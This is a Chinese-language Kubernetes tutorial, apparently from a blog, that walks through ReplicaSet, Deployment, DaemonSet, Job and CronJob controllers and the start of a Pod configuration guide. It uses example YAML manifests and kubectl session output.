pc-replicaset -n default --cascade=falsereplicaset.apps &quot;pc-replicaset&quot; deleted[root@master yaml]# kubectl get pods -n defaultNAME                  READY   STATUS    RESTARTS   AGEpc-replicaset-cl82j   1/1     Running   0          75spc-replicaset-dslhb   1/1     Running   0          75s# 也可以使用yaml直接删除(推荐)[root@master yaml]#  kubectl delete -f Pc-Replicaset.yamlreplicaset.apps &quot;pc-replicaset&quot; deleted\n\nDeployment(Deploy)概述kubernetes在V1.2版本开始，引入了Deployment控制器。值得一提的是，这种控制器并不直接管理pod，而是通过管理ReplicaSet来简介管理Pod，即：Deployment管理ReplicaSet，ReplicaSet管理Pod。所以Deployment比ReplicaSet功能更加强大。\n\nDeployment主要功能有下面几个：\n\n支持ReplicaSet的所有功能\n支持发布的停止、继续\n支持滚动升级和回滚版本\n\n资源清单apiVersion: apps/v1 # 版本号kind: Deployment # 类型       metadata: # 元数据  name: # deploy名称   namespace: # 所属命名空间   labels: #标签spec: # 详情描述  replicas: &lt;副本数量&gt;  revisionHistoryLimit: &lt;保留历史版本数量&gt;  paused: false # 暂停部署，默认是false  progressDeadlineSeconds: 600 # 部署超时时间（s），默认是600  strategy: # 策略    type: &lt;更新策略&gt;    rollingUpdate: # 滚动更新      maxSurge: 30% # 最大额外可以存在的副本数，可以为百分比，也可以为整数      maxUnavailable: 30% # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数  selector: # 选择器，通过它指定该控制器管理哪些pod    matchLabels:      # Labels匹配规则    matchExpressions: # Expressions匹配规则      - &#123;key: &lt;lableskey&gt;, operator: &lt;匹配方式&gt;, values: &lt;lablesvalue&gt;&#125;  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本    metadata:      labels:    spec:      containers:      - name:         image:         ports:\n\n创建deploy创建Pc-Deployment.yaml，内容如下\napiVersion: apps/v1kind: Deployment      metadata:  name: pc-deployment  namespace: defaultspec:   replicas: 3  selector:    matchLabels:      app: nginx-pod  template:    metadata:      labels:        app: nginx-pod    spec:      containers:      - name: nginx        image: docker.io/library/nginx:1.23.1\n\n# 创建deploy[root@master yaml]# kubectl create -f Pc-Deployment.yaml --record=trueFlag --record has been deprecated, --record will be removed in the futuredeployment.apps/pc-deployment created# 查看deploy# UP-TO-DATE 最新版本的pod的数量# AVAILABLE  当前可用的pod的数量[root@master yaml]# kubectl get deploy pc-deployment -n defaultNAME            READY   UP-TO-DATE   AVAILABLE   AGEpc-deployment   3/3     3            3           85s# 查看rs# 发现rs的名称是在原来查看deploy的名字后面添加了一个10位数的随机串[root@master yaml]# kubectl get rs -n defaultNAME                       DESIRED   CURRENT   READY   AGEpc-deployment-6895856946   3         3         3       2m14s# 查看pod[root@master yaml]# kubectl get pods -n defaultNAME                             READY   STATUS             RESTARTS          AGEpc-deployment-6895856946-7nbs4   1/1     Running            0                 3m30spc-deployment-6895856946-g5n6g   1/1     Running            0                 3m30spc-deployment-6895856946-jkqnm   1/1     Running            0                 3m30s\n\n扩缩容# 命令方式[root@master yaml]# kubectl scale deploy pc-deployment --replicas=5  -n defaultdeployment.apps/pc-deployment scaled# 查看deploy[root@master yaml]# kubectl get deploy pc-deployment -n defaultNAME            READY   UP-TO-DATE   AVAILABLE   AGEpc-deployment   5/5     5            5           3m24s# 查看pod数量[root@master yaml]# kubectl get pods -n defaultNAME                             READY   STATUS             RESTARTS          AGEpc-deployment-6895856946-2tpfc   1/1     Running            0                 4m2spc-deployment-6895856946-5pn96   1/1     Running            0                 4m2spc-deployment-6895856946-792dj   1/1     Running            0                 4m2spc-deployment-6895856946-89vrz   1/1     Running            0                 117spc-deployment-6895856946-hl7pz   1/1     Running            0                 117s# 在线编辑方式# 修改spec.replicase为3[root@master yaml]# kubectl edit deploy pc-deployment -n defaultdeployment.apps/pc-deployment edited# 查看deploy[root@master yaml]# kubectl get deploy pc-deployment -n defaultNAME            READY   UP-TO-DATE   AVAILABLE   AGEpc-deployment   3/3     3            3           6m18s# 查看pod数量[root@master yaml]# kubectl get pods -n defaultNAME                             READY   STATUS             RESTARTS          AGEpc-deployment-6895856946-792dj   1/1     Running            0                 6m44spc-deployment-6895856946-89vrz   1/1     Running            0                 6m44spc-deployment-6895856946-792dj   1/1     Running            0                 6m44s\n\n镜像更新deployment支持两种更新策略:重建更新和滚动更新,可以通过strategy指定策略类型,支持两个属性:\nstrategy：指定新的Pod替换旧的Pod的策略， 支持两个属性：  type：指定策略类型，支持两种策略    Recreate：在创建出新的Pod之前会先杀掉所有已存在的Pod    RollingUpdate：滚动更新，就是杀死一部分，就启动一部分，在更新过程中，存在两个版本Pod  rollingUpdate：当type为RollingUpdate时生效，用于为RollingUpdate设置参数，支持两个属性：    maxUnavailable：用来指定在升级过程中不可用Pod的最大数量，默认为25%。    maxSurge： 用来指定在升级过程中可以超过期望的Pod的最大数量，默认为25%。\n\n重建更新# 修改配置清单，并更新配置# 修改spec.strategy.type为Recreate[root@master yaml]# vim Pc-Deployment.yaml[root@master yaml]# kubectl apply -f Pc-Deployment.yamldeployment.apps/pc-deployment configured# 命令方式更变镜像[root@master yaml]# kubectl set image deployment pc-deployment nginx=docker.io/library/nginx:latest -n defaultdeployment.apps/pc-deployment image updated# 查看升级过程[root@master yaml]# kubectl get pods -n default -wNAME                             READY   STATUS             RESTARTS        AGEpc-deployment-6895856946-9zvpn   1/1     Terminating        0               5spc-deployment-6895856946-bnz2v   1/1     Terminating        0               5spc-deployment-6895856946-6dswz   0/1     Terminating        0               5spc-deployment-74556686fb-f76kc   0/1     Pending            0               0spc-deployment-74556686fb-g48rh   0/1     Pending            0               0spc-deployment-74556686fb-m2rvf   0/1     Pending            0               0spc-deployment-74556686fb-f76kc   0/1     ContainerCreating   0               0spc-deployment-74556686fb-g48rh   0/1     ContainerCreating   0               0spc-deployment-74556686fb-m2rvf   0/1     ContainerCreating   0               0spc-deployment-74556686fb-g48rh   1/1     Running             0               1spc-deployment-74556686fb-f76kc   1/1     Running             0               2spc-deployment-74556686fb-m2rvf   1/1     Running             0               2s\n\n滚动更新# 修改配置清单，并更新配置# 修改spec.strategy.type为RollingUpdate,并添加rollingUpdate配置[root@master yaml]# vim Pc-Deployment.yamlspec:  strategy:    type: RollingUpdate    rollingUpdate:      maxSurge: 33%      maxUnavailable: 33%[root@master yaml]# kubectl apply -f Pc-Deployment.yamldeployment.apps/pc-deployment configured# 更变镜像[root@master yaml]#  kubectl set image deployment pc-deployment nginx=docker.io/library/nginx:latest -n defaultdeployment.apps/pc-deployment image updated# 查看升级过程[root@master yaml]# kubectl get pod -n default -wpc-deployment-6895856946-47gjm   1/1     Running            0                 2m33spc-deployment-6895856946-4rhkr   1/1     Running            0                 2m32spc-deployment-6895856946-6xg5w   1/1     Running            0                 2m30spc-deployment-74556686fb-7bz2k   0/1     Pending            0                 0spc-deployment-74556686fb-7bz2k   0/1     ContainerCreating   0                 0spc-deployment-74556686fb-7bz2k   1/1     Running             0                 1spc-deployment-6895856946-47gjm   1/1     Terminating         0                 2m43spc-deployment-74556686fb-xnvx5   0/1     Pending             0                 0spc-deployment-74556686fb-xnvx5   0/1     ContainerCreating   0                 0spc-deployment-74556686fb-xnvx5   1/1     Running             0                 2spc-deployment-6895856946-4rhkr   1/1     Terminating         0                 2m44spc-deployment-74556686fb-zgrss   0/1     Pending             0                 0spc-deployment-74556686fb-zgrss   0/1     ContainerCreating   0                 0spc-deployment-74556686fb-zgrss   1/1     Running             0                 1spc-deployment-6895856946-6xg5w   1/1     Terminating         0                 2m43s# 至此，新版本的pod创建完毕，旧版本的pod销毁完毕\n\n滚动更新的过程如下：\n\n版本回退在镜像更新之后，查看rs的变化，变化如下\n# 查看rs,发现原来的rs的依旧存在，只是pod数量变为了0，而后又新产生了一个rs，pod数量为3，其实这就是deployment能够进行版本回退的奥妙所在，后面会详细解释。[root@master yaml]# kubectl get rs -n defaultNAME                       DESIRED   CURRENT   READY   AGEpc-deployment-6696798b78   0         0         0       7m37spc-deployment-6696798b11   0         0         0       5m37spc-deployment-c848d76789   3         3         3       72s\n\ndeployment支持版本升级过程中的暂停、继续功能以及版本回退等诸多功能，命令如下\nkubectl rollout： 版本升级相关功能，支持下面的选项： status       显示当前升级状态 history     显示 升级历史记录 pause       暂停版本升级过程 resume    继续已经暂停的版本升级过程 restart      重启版本升级过程 undo        回滚到上一级版本（可以使用--to-revision回滚到指定版本）\n\n# 查看当前升级版本的状态[root@master yaml]# kubectl rollout status deploy pc-deployment -n defaultdeployment &quot;pc-deployment&quot; successfully rolled out# 查看升级历史记录[root@master yaml]# kubectl rollout history deploy pc-deployment -n defaultdeployment.apps/pc-deploymentREVISION  CHANGE-CAUSE1         kubectl create --filename=Pc-Deployment.yaml --record=true2         kubectl create --filename=Pc-Deployment.yaml --record=true3         kubectl create --filename=Pc-Deployment.yaml --record=true# 版本回滚# --to-revision=1# 1是最初创建的版本，2是上一个，3是现在的[root@master yaml]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n defaultdeployment.apps/pc-deployment rolled back# 查看发现，通过nginx镜像版本可以发现到了最初版本[root@master yaml]# kubectl get deploy -n default -o wideNAME            READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES                           SELECTORpc-deployment   3/3     1            3           47m   nginx        docker.io/library/nginx:1.32.1   app=nginx-pod# 查看rs，发现第一个rs中有3个pod运行，后面两个版本的rs中pod为运行[root@master yaml]# kubectl get rs -n defaultNAME                       DESIRED   CURRENT   READY   AGEpc-deployment-6696798b78   3         3         3       78mpc-deployment-966bf7f44    0         0         0       37mpc-deployment-c848d767     0         0         0       71m\n\n金丝雀发布Deployment控制器支持控制更新过程中的控制，如“暂停(pause)”或“继续(resume)”更新操作。比如有一批新的Pod资源创建完成后立即暂停更新过程，此时，仅存在一部分新版本的应用，主体部分还是旧的版本。然后，再筛选一小部分的用户请求路由到新版本的Pod应用，继续观察能否稳定地按期望的方式运行。确定没问题之后再继续完成余下的Pod资源滚动更新，否则立即回滚更新操作。这就是所谓的金丝雀发布。\n# 更新deployment的版本，并配置暂停deployment[root@master yaml]#  kubectl set image deploy pc-deployment nginx=docker.io/library/nginx:latest -n default &amp;&amp; kubectl rollout pause deployment pc-deployment  -n defaultdeployment.apps/pc-deployment image updateddeployment.apps/pc-deployment paused# 查看更新状态[root@master yaml]# kubectl rollout status deploy pc-deployment -n default　Waiting for deployment &quot;pc-deployment&quot; rollout to finish: 1 out of 3 new replicas have been updated...# 查看rs[root@master yaml]# kubectl get rs -n default -o wideNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         pc-deployment-5d89bdfbf9   2         2         2       19m     nginx        docker.io/library/nginx:1.32.1pc-deployment-675d469f8b   0         0         0       14m     nginx        docker.io/library/nginx:latestpc-deployment-6c9f56fcfb   1         1         1       3m16s   nginx        docker.io/library/nginx:1.32.1# 查看Pod[root@master yaml]# kubectl get rs -n default -o wideNAME                             READY   STATUS    RESTARTS   AGEpc-deployment-5d89bdfbf9-rj8sq   1/1     Running   0          7m33spc-deployment-5d89bdfbf9-ttwgg   1/1     Running   0          7m35spc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          3m31s# 继续更新[root@master yaml]# kubectl rollout resume deploy pc-deployment -n defaultdeployment.apps/pc-deployment resumed# 查看rs[root@master yaml]# kubectl get rs -n default -o wideNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         pc-deployment-5d89bdfbf9   0         0         0       21m     nginx        docker.io/library/nginx:1.32.1pc-deployment-675d469f8b   0         0         0       16m     nginx        docker.io/library/nginx:latest pc-deployment-6c9f56fcfb   3         3         3       5m11s   nginx        docker.io/library/nginx:1.32.1# 查看Pod[root@master yaml]# kubectl get pods -n defaultNAME                             READY   STATUS    RESTARTS   AGEpc-deployment-6c9f56fcfb-996rt   1/1     Running   0          5m27spc-deployment-6c9f56fcfb-7bfwh   1/1     Running   0          37spc-deployment-6c9f56fcfb-rf84v   1/1     Running   0          37s\n\n删除deploy# 删除deployment，deploy管理的rs和pod将也会被删除[root@master yaml]# kubectl delete -f Pc-Deployment.yamldeployment.apps &quot;pc-deployment&quot; deleted\n\nDaemonSet(DS)概述DaemonSet类型的控制器可以保证在集群中的每一台（或指定）节点上都运行一个副本。一般适用于日志收集、节点监控等场景。也就是说，如果一个Pod提供的功能是节点级别的（每个节点都需要且只需要一个），那么这类Pod就适合使用DaemonSet类型的控制器创建。\n\n特点\n每当向集群中添加一个节点时，指定的 Pod 副本也将添加到该节点上\n当节点从集群中移除时，Pod 也就被垃圾回收了\n\n资源清单apiVersion: apps/v1 # 版本号kind: DaemonSet # 类型       metadata: # 元数据  name: # ds名称   namespace: # 所属命名空间   labels: #标签spec: # 详情描述  revisionHistoryLimit: &lt;保留历史版本&gt;  updateStrategy: # 更新策略    type: RollingUpdate # 滚动更新策略    rollingUpdate: # 滚动更新      maxUnavailable: 1 # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数  selector: # 选择器，通过它指定该控制器管理哪些pod    matchLabels:      # Labels匹配规则      - &#123;key: value&#125;    matchExpressions: # Expressions匹配规则      - &#123;key: app, operator: In, values: [nginx-pod]&#125;  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本    metadata:      labels:    spec:      containers:      - name:         image:         ports:\n\n创建DS创建文件Pc-Daemonset.yaml,内容如下\napiVersion: apps/v1kind: DaemonSet      metadata:  name: pc-daemonset  namespace: defaultspec:   selector:    matchLabels:      app: nginx-pod  template:    metadata:      labels:        app: nginx-pod    spec:      containers:      - name: nginx        image: docker.io/library/nginx:1.23.1\n\n# 创建DS[root@master yaml]# kubectl create -f Pc-Daemonset.yamldaemonset.apps/pc-daemonset created# 查看DS[root@master yaml]# kubectl get ds -n default -o wideNAME           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE    CONTAINERS   IMAGES                           SELECTORpc-daemonset   2         2         2       2            2           &lt;none&gt;          104s   nginx        docker.io/library/nginx:1.23.1   app=nginx-pod# 查看pod,发现在每个work节点上都运行一个pod[root@master yaml]# kubectl get pods -n default -o wideNAME                             READY   STATUS             RESTARTS          AGE     IP              NODE             NOMINATED NODE   READINESS GATESpc-daemonset-h6q4b               1/1     Running            0                 2m23s   10.244.67.78    work1.host.com   &lt;none&gt;           &lt;none&gt;pc-daemonset-lghrj               1/1     Running            0                 2m23s   10.244.52.209   work2.host.com   &lt;none&gt;           &lt;none&gt;\n\n删除DS# 删除DS[root@master yaml]# kubectl delete -f Pc-dDaemonset.yamldaemonset.apps &quot;pc-daemonset&quot; deleted\n\nJob概述Job，主要用于负责**批量处理(一次要处理指定数量任务)短暂的一次性(每个任务仅运行一次就结束)**任务。Job特点如下：\n\n当Job创建的pod执行成功结束时，Job将记录成功结束的pod数量\n当成功结束的pod达到指定的数量时，Job将完成执行\n\n\n资源清单apiVersion: batch/v1 # 版本号kind: Job # 类型       metadata: # 元数据  name: # rs名称   namespace: # 所属命名空间   labels: #标签    controller: jobspec: # 详情描述  completions: 1 # 指定job需要成功运行Pods的次数。默认值: 1  parallelism: 1 # 指定job在任一时刻应该并发运行Pods的数量。默认值: 1  activeDeadlineSeconds: &lt;可运行时间期限&gt; # 指定job可运行的时间期限，超过时间还未结束，系统将会尝试进行终止。  backoffLimit: 6 # 指定job失败后进行重试的次数。默认是6  manualSelector: false # 是否可以使用selector选择器选择pod，默认是false  selector: # 选择器，通过它指定该控制器管理哪些pod    matchLabels:      # Labels匹配规则\t  - &#123;key: value&#125;    matchExpressions: # Expressions匹配规则      - &#123;key: app, operator: In, values: [counter-pod]&#125;  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本    metadata:      labels:    spec:      restartPolicy: &lt;重启策略&gt; # 重启策略只能设置为Never或者OnFailure      containers:      - name:         image:         command: \n\n关于重启策略设置的说明：    如果指定为OnFailure，则job会在pod出现故障时重启容器，而不是创建pod，failed次数不变    如果指定为Never，则job会在pod出现故障时创建新的pod，并且故障pod不会消失，也不会重启，failed次数加1    如果指定为Always的话，就意味着一直重启，意味着job任务会重复去执行了，当然不对，所以不能设置为Always\n\n创建Job创建Pc-Job.yaml,内容如下\napiVersion: batch/v1kind: Job      metadata:  name: pc-job  namespace: defaultspec:  manualSelector: true  selector:    matchLabels:      app: counter-pod  template:    metadata:      labels:        app: counter-pod    spec:      restartPolicy: Never      containers:      - name: counter        image: docker.io/library/busybox:1.35.0        command: [&quot;bin/sh&quot;,&quot;-c&quot;,&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done&quot;]\n\n# 创建Job[root@master yaml]# kubectl create -f Pc-Job.yamljob.batch/pc-job created# 持续观察Job状态[root@master yaml]# kubectl get job -n default -o wide -wNAME     COMPLETIONS   DURATION   AGE   CONTAINERS   IMAGES                             SELECTORpc-job   0/1           1s         1s    counter      docker.io/library/busybox:1.35.0   app=counter-podpc-job   0/1           3s         3s    counter      docker.io/library/busybox:1.35.0   app=counter-pod# 查看Pod状态# 可以发现pod运行完命令之后就会边车Completed[root@master yaml]# kubectl get pod -n default -o wide -wNAME                             READY   STATUS             RESTARTS          AGE     IP              NODE             NOMINATED NODE   READINESS GATESpc-job-6qwpd                     1/1     Running          0                   29s   10.244.67.81    work1.host.com   &lt;none&gt;           &lt;none&gt;pc-job-6qwpd                     0/1     Completed          0                 119s   10.244.67.81    work1.host.com   &lt;none&gt;           &lt;none&gt;\n\n删除Job# 删除job[root@master yaml]# kubectl delete -f Pc-Job.yamljob.batch &quot;pc-job&quot; deleted\n\nCronJob(CJ)概述CronJob控制器以Job控制器资源为其管控对象，并借助它管理pod资源对象，Job控制器定义的作业任务在其控制器资源创建之后便会立即执行，但CronJob可以以类似于Linux操作系统的周期性任务作业计划的方式控制其运行时间点及重复运行的方式。也就是说，CronJob可以在特定的时间点(反复的)去运行job任务。\n\n资源清单apiVersion: batch/v1beta1 # 版本号kind: CronJob # 类型       metadata: # 元数据  name: # rs名称   namespace: # 所属命名空间   labels: #标签    controller: cronjobspec: # 详情描述  schedule: # cron格式的作业调度运行时间点,用于控制任务在什么时间执行  concurrencyPolicy: # 并发执行策略，用于定义前一次作业运行尚未完成时是否以及如何运行后一次的作业  failedJobHistoryLimit: # 为失败的任务执行保留的历史记录数，默认为1  successfulJobHistoryLimit: # 为成功的任务执行保留的历史记录数，默认为3  startingDeadlineSeconds: # 启动作业错误的超时时长  jobTemplate: # job控制器模板，用于为cronjob控制器生成job对象;下面其实就是job的定义    metadata:    spec:      completions: 1      parallelism: 1      activeDeadlineSeconds: 30      backoffLimit: 6      manualSelector: true      selector:        matchLabels:        matchExpressions: 规则          - &#123;key: app, operator: In, values: [counter-pod]&#125;      template:        metadata:          labels:        spec:          restartPolicy:           containers:          - name:             image:             command: \n\n需要重点解释的几个选项：schedule: cron表达式，用于指定任务的执行时间\t*/1    *      *    *     *\t&lt;分钟&gt; &lt;小时&gt; &lt;日&gt; &lt;月份&gt; &lt;星期&gt;    分钟 值从 0 到 59.    小时 值从 0 到 23.    日 值从 1 到 31.    月 值从 1 到 12.    星期 值从 0 到 6, 0 代表星期日    多个时间可以用逗号隔开； 范围可以用连字符给出；*可以作为通配符； /表示每...concurrencyPolicy:\tAllow:   允许Jobs并发运行(默认)\tForbid:  禁止并发运行，如果上一次运行尚未完成，则跳过下一次运行\tReplace: 替换，取消当前正在运行的作业并用新作业替换它\n\n创建CJ创建Pc-Cronjob.yaml,内容如下:\napiVersion: batch/v1beta1kind: CronJobmetadata:  name: pc-cronjob  namespace: default  labels:    controller: cronjobspec:  schedule: &quot;*/1 * * * *&quot;  jobTemplate:    metadata:    spec:      template:        spec:          restartPolicy: Never          containers:          - name: counter            image: docker.io/library/busybox:1.35.0            command: [&quot;bin/sh&quot;,&quot;-c&quot;,&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done&quot;]\n\n# 创建CJ[root@master yaml]# kubectl create -f Pc-Cronjob.yamlWarning: batch/v1beta1 CronJob is deprecated in v1.21+, unavailable in v1.25+; use batch/v1 CronJobcronjob.batch/pc-cronjob created# 查看CJ[root@master yaml]# kubectl get cronjobs -n defaultNAME         SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGEpc-cronjob   */1 * * * *   False     1        9s              58s# 查看job[root@master yaml]# kubectl get job -n defaultNAME                  COMPLETIONS   DURATION   AGEpc-cronjob-27705149   0/1           2m8s       2m8spc-cronjob-27705150   0/1           68s        68spc-cronjob-27705151   0/1           8s         8s# 查看pod[root@master yaml]# kubectl get pods -n defaultNAME                             READY   STATUS             RESTARTS          AGEpc-cronjob-27705149-kms26        0/1     Completed   0                 2m37spc-cronjob-27705150-2mvkv        0/1     Completed   0                 97spc-cronjob-27705151-dvr8c        1/1     Running       0                 37s\n\n删除CJ[root@master yaml]# kubectl delete -f Pc-Cronjob.yamlWarning: batch/v1beta1 CronJob is deprecated in v1.21+, unavailable in v1.25+; use batch/v1 CronJobcronjob.batch &quot;pc-cronjob&quot; deleted","categories":["容器编排"],"tags":["开源工具","Kubernetes","Pod控制器","Pod"]},{"title":"Kubernetes-Pod详解","url":"/2022/08/29/Kubernetes-Pod%E8%AF%A6%E8%A7%A3/","content":"概述Pod什么是Pod?Pod 是在 Kubernetes 中创建和管理的、最小的可部署的计算单元。Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器； 这些容器共享存储、网络、以及怎样运行这些容器的声明。 Pod 中的内容总是并置（colocated）的并且一同调度,在共享的上下文中运行。 Pod 所建模的是特定于应用的 “逻辑主机”,其中包含一个或多个应用容器, 这些容器相对紧密地耦合在一起。 在非云环境中,在相同的物理机或虚拟机上运行的应用类似于在同一逻辑主机上运行的云应用。\nPod的结构\n每一个Pod都可以包含一个或者多个容器,这些容器分为两种:\n\n程序容器,业务容器,数量可多可少\nPause容器,这是每个Pod都会有的一个根容器,他的作用有两个:\n可以以它为依据,评估整个Pod的健康状态\n可以在跟容器上设置ip地址,其他容器都用此ip(Pod IP),以实现Pod内部的网络通信\n\n\n\n资源清单apiVersion: v1     #必选,版本号,例如v1kind: Pod       　 #必选,资源类型,例如 Podmetadata:       　 #必选,元数据  name: string     #必选，Pod名称  namespace: string  #Pod所属的命名空间,默认为&quot;default&quot;  labels:       　　  #自定义标签列表    - name: string      　          spec:  #必选，Pod中容器的详细定义  containers:  #必选，Pod中容器列表  - name: string   #必选,容器名称    image: string  #必选,容器的镜像名称    imagePullPolicy: [ Always|Never|IfNotPresent ]  #获取镜像的策略     command: [string]   #容器的启动命令列表,如不指定,使用打包时使用的启动命令    args: [string]      #容器的启动命令参数列表    workingDir: string  #容器的工作目录    volumeMounts:       #挂载到容器内部的存储卷配置    - name: string      #引用pod定义的共享存储卷的名称,需用volumes[]部分定义的的卷名      mountPath: string #存储卷在容器内mount的绝对路径,应少于512字符      readOnly: boolean #是否为只读模式    ports: #需要暴露的端口库号列表    - name: string        #端口的名称      containerPort: int  #容器需要监听的端口号      hostPort: int       #容器所在主机需要监听的端口号,默认与Container相同      protocol: string    #端口协议,支持TCP和UDP，默认TCP    env:   #容器运行前需设置的环境变量列表    - name: string  #环境变量名称      value: string #环境变量的值    resources: #资源限制和请求的设置      limits:  #资源限制的设置        cpu: string     #Cpu的限制,单位为core数,将用于docker run --cpu-shares参数        memory: string  #内存限制,单位可以为Mib/Gib，将用于docker run --memory参数      requests: #资源请求的设置        cpu: string    #Cpu请求,容器启动的初始可用数量        memory: string #内存请求,容器启动的初始可用数量    lifecycle: #生命周期钩子\t\tpostStart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启\t\tpreStop: #容器终止前执行此钩子,无论结果如何,容器都会终止    livenessProbe:  #对Pod内各容器健康检查的设置,当探测无响应几次后将自动重启该容器      exec:       　 #对Pod容器内检查方式设置为exec方式        command: [string]  #exec方式需要制定的命令或脚本      httpGet:       #对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port        path: string        port: number        host: string        scheme: string        HttpHeaders:        - name: string          value: string      tcpSocket:     #对Pod内个容器健康检查方式设置为tcpSocket方式         port: number       initialDelaySeconds: 0       #容器启动完成后首次探测的时间,单位为秒       timeoutSeconds: 0    　　    #对容器健康检查探测等待响应的超时时间,单位秒,默认1秒       periodSeconds: 0     　　    #对容器监控检查的定期探测时间设置,单位秒,默认10秒一次       successThreshold: 0       failureThreshold: 0       securityContext:         privileged: false  restartPolicy: [Always | Never | OnFailure]  #Pod的重启策略  nodeName: &lt;string&gt; #设置NodeName表示将该Pod调度到指定到名称的node节点上  nodeSelector: obeject #设置NodeSelector表示将该Pod调度到包含这个label的node上  imagePullSecrets: #Pull镜像时使用的secret名称,以key：secretkey格式指定  - name: string  hostNetwork: false   #是否使用主机网络模式,默认为false，如果设置为true，表示使用宿主机网络  volumes:   #在该pod上定义共享存储卷列表  - name: string    #共享存储卷名称 （volumes类型有很多种）    emptyDir: &#123;&#125;       #类型为emtyDir的存储卷,与Pod同生命周期的一个临时目录。为空值    hostPath: string   #类型为hostPath的存储卷,表示挂载Pod所在宿主机的目录      path: string      　　        #Pod所在宿主机的目录,将被用于同期中mount的目录    secret:       　　　#类型为secret的存储卷,挂载集群与定义的secret对象到容器内部      scretname: string        items:           - key: string        path: string    configMap:         #类型为configMap的存储卷,挂载预定义的configMap对象到容器内部      name: string      items:      - key: string        path: string\n\nPod配置基本配置创建一个名字为Pod-Basic.yaml文件,内容如下:\napiVersion: v1kind: Podmetadata:  name: pod-basic  namespace: default  labels:    app: podspec:  containers:  - name: mynginx    image: docker.io/library/nginx:1.23.1  - name: mybusybox    image: docker.io/library/busybox:1.35.0\n\n上面定义了一个比较简单Pod的配置,名字叫做”pod-basic”,命名空间在”default”下, 并给他打了一个标签叫做”app:pod”,并定义了两个容器:\n\nmynginx: 使用docker镜像仓库的nginx镜像版本为1.23.1\nbusybox: 使用docker镜像仓库的busybox镜像版本为2.4.54\n\n定义好资源清单之后可以使用下面的命令进行管理:\n# 创建pod[root@master yaml]# kubectl create -f Pod-Basic.yamlpod/pod-basic created# 查看pod状态# &quot;-n default&quot;是指定命名空间,这里不加也可以查询到,因为不加默认查询的就是default命名空间下的资源# READY 1/2 表示当前Pod中有2个容器,其中1个准备就绪,1个未就绪# RESTARTS  重启次数,因为有1个容器故障了，Pod一直在重启试图恢复它[root@master yaml]# kubectl get pod -n defaultNAME            READY   STATUS     RESTARTS      AGEpod-basic       1/2     NotReady   2 (29s ago)   43s# 查看pod的详细信息[root@master yaml]# kubectl describe pod pod-basic -n default\n\n\n\n镜像拉取创建Pod-ImagePull.yaml文件,内容如下:\napiVersion: v1kind: Podmetadata:  name: pod-imagepull  namespace: defaultspec:  containers:  - name: mynginx    image: docker.io/library/nginx:1.23.1    imagePullPolicy: Always                                     # 设置镜像拉取策略  - name: mybusybox    image: docker.io/library/busybox:2.4.54\n\nimagePullPolicy，用于设置镜像拉取策略，kubernetes支持配置三种拉取策略：\n\nAlways：总是从远程仓库拉取镜像（一直远程下载）\nIfNotPresent：本地有则使用本地镜像,本地没有则从远程仓库拉取镜像（本地有就本地  本地没远程下载）\nNever：只使用本地镜像,从不去远程仓库拉取,本地没有就报错 （一直使用本地）\n\n\n默认值说明：\n​    如果镜像tag为具体版本号, 默认策略是：IfNotPresent\n​\t如果镜像tag为：latest（最终版本） ,默认策略是always\n\n# 创建pod[root@master yaml]# kubectl create -f Pod-ImagePull.yamlpod/pod-imagepull created# 查看Pod详情# 此时明显可以看到nginx镜像有一步Pulling image &quot;nginx:1.17.1&quot;的过程[root@master yaml]# kubectl describe pod pod-imagepull -n default......Events:  Type    Reason     Age              From               Message  ----    ------     ----             ----               -------  Normal  Scheduled  5s               default-scheduler  Successfully assigned default/pod-imagepull to work1.host.com  Normal  Pulling    4s               kubelet            Pulling image &quot;docker.io/library/nginx:1.23.1&quot;  Normal  Pulled     1s               kubelet            Successfully pulled image &quot;docker.io/library/nginx:1.23.1&quot; in 2.762104819s  Normal  Created    1s               kubelet            Created container mynginx  Normal  Started    1s               kubelet            Started container mynginx  Normal  Pulled     1s (x2 over 1s)  kubelet            Container image &quot;docker.io/library/busybox:1.35.0&quot; already present on machine  Normal  Created    1s (x2 over 1s)  kubelet            Created container mybusybox  Normal  Started    1s               kubelet            Started container mybusybox\n\n启动命令在上面的配置中mybusybox容器一直没有成功运行,原因就是mybusybox容器不是一个程序,而是一个类似于一个工具类的合集，kubernetes集群启动后,会因为没有程序支撑运行而关闭容器。解决方法就是让他一直运行一个命令或者程。\n创建Pod-Command.yaml文件,内容如下:\napiVersion: v1kind: Podmetadata:  name: pod-command  namespace: default  labels:    app: podspec:  containers:  - name: mynginx    image: docker.io/library/nginx:1.23.1  - name: mybusybox    image: docker.io/library/busybox:1.35.0    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;touch /tmp/hello.txt;while true;do /bin/echo $(date +%T) &gt;&gt; /tmp/hello.txt; sleep 3; done;&quot;]\n\ncommand: 在pod中的容器初始化完成之后运行的命令。\n\n命令解释：\n​\t&quot;/bin/sh&quot;,&quot;-c&quot; 使用sh来执行命令\n​\ttouch /tmp/hello.txt; 在&#x2F;tmp下创建一个hello.txt文件\n​     while true;do /bin/echo $(date +%T) &gt;&gt; /tmp/hello.txt; sleep 3; done;每过三秒就往&#x2F;tmp&#x2F;hello.txt文件里面追加当前的时间\n\n# 创建pod[root@master yaml]# kubectl create -f Pod-Command.yamlpod/pod-command created# 查看Pod状态# 这个时候俩容器就都正常运行了[root@master yaml]# kubectl get pod[root@master yaml]# kubectl get podNAME            READY   STATUS             RESTARTS         AGEpod-command     2/2     Running            0                1m38s# 进入容器查看文件内容[root@master yaml]# kubectl exec pod-command -n default -it -c mybusybox /bin/sh/ # tail -f 